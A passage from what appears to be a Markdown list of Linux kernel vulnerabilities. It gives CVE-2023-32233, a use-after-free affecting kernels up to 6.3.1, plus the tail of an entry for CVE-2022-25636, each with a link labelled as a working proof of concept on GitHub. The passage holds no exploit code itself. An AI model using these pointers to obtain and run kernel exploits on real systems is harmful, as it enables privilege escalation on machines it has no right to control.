  - Working [POC](https://github.com/Bonfee/CVE-2022-25636.git)
- CVE-2023-32233
  - Kernel vulnerability (use-after-free)
  - Affected version(s):
    - up to version 6.3.1
  - Working [POC](https://github.com/Liuk3r/CVE-2023-32233)
